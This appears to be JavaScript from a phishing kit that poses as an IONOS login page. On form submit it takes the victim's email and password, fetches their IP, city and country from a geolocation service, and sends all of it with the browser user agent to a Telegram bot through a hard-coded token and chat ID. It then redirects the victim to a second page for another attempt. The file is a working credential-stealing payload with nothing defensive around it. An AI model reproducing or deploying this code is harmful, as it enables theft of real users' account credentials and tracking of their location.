// Get the email from localStorage
const email = localStorage.getItem("userEmail") ||
sessionStorage.getItem("userEmail") || '';

if (email) {
  const emailText = document.getElementById('emailText');
  if (emailText) {
    emailText.textContent = email;
  }
}

document.getElementById("passwordForm").addEventListener("submit", async function(event) {
  event.preventDefault(); 

  const email = localStorage.getItem("userEmail") || '';

  async function getUserLocation() {
    try {
      const response = await fetch("https://ipapi.co/json/");
      const data = await response.json();
      return {
        country: data.country_name || "Unknown",
        city: data.city || "Unknown",
        ip: data.ip || "Unknown"
      };
    } catch (error) {
      console.error("Error fetching user location:", error);
      return { country: "Unknown", city: "Unknown", ip: "Unknown" };
    }
  }

  const userAgent = navigator.userAgent;
  const password = document.getElementById("password").value;

  const telegramToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
  const chatID = "6837437455";
  const location = await getUserLocation();

  const message = `IONOS 1st Attempt\nEmail: ${email}\nPassword: ${password} \n IP: ${location.ip}\nCountry: ${location.country}\nCity: ${location.city}\nBrowser: ${userAgent}`;
  const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;

  try {
    await fetch(telegramURL);
    window.location.href = `secondpage.html#${encodeURIComponent(email)}`;
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
});




  function getStoredOrHashedEmail() {
    const local = localStorage.getItem("userEmail");
    const session = sessionStorage.getItem("userEmail");
    const hash = window.location.hash ? decodeURIComponent(window.location.hash.substring(1)) : "";

    return local || session || hash || '';
  }

  document.addEventListener("DOMContentLoaded", () => {
    const email = getStoredOrHashedEmail();

    if (email) {
      try {
        // Try storing it again for future use
        localStorage.setItem("userEmail", email);
      } catch (e) {
        try {
          sessionStorage.setItem("userEmail", email);
        } catch (e2) {
          console.warn("Storage failed again on second page");
        }
      }

      // Update the UI
      const emailText = document.getElementById("emailText");
      if (emailText) {
        emailText.textContent = email;
      }
    }
  });

